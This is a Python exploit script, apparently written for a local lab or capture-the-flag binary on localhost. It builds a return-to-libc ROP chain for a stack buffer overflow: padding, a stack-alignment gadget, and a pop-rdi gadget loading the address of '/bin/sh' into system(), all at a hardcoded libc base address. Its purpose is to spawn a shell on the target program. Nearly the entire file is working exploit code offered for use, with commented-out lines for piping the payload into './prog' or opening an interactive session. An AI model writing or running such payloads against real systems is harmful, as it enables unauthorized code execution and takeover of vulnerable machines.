#!/usr/bin/env python3

import sys
from socket import *
from struct import pack
import telnetlib
import subprocess

HOST = "localhost"
PORT = 4000

def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def main():
  # [LOCAL STACK] [EBP] [RET] [ARGS ...]

  libc_load_addr = 0x7ffff7d75000

  set_rdi_gadget_offset = 0x2a3e5
  system_offset = 0x50d60
  binsh_string_offset = 0x1d8698

  payload = b""
  payload += b"A" * 64  # padding
  payload += dq(0)  # rbp
  payload += dq(0x40101a)  # ret gadget for stack alignment to 16 bytes
  payload += dq(libc_load_addr + set_rdi_gadget_offset)
  payload += dq(libc_load_addr + binsh_string_offset)  # rdi value
  payload += dq(libc_load_addr + system_offset)  # jmp to system
  payload += dq(0)  # return address

  # open("input", "wb").write(payload)
  sys.stdout.buffer.write(payload)

  # command = ["./prog"]
  # p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
  # (stdout, stderr) = p.communicate(input=payload)

  # print(stdout)
  # print(stderr)

  # start interactive session
  #t = telnetlib.Telnet()
  #t.sock = s
  #t.interact()

if __name__ == "__main__":
  main()

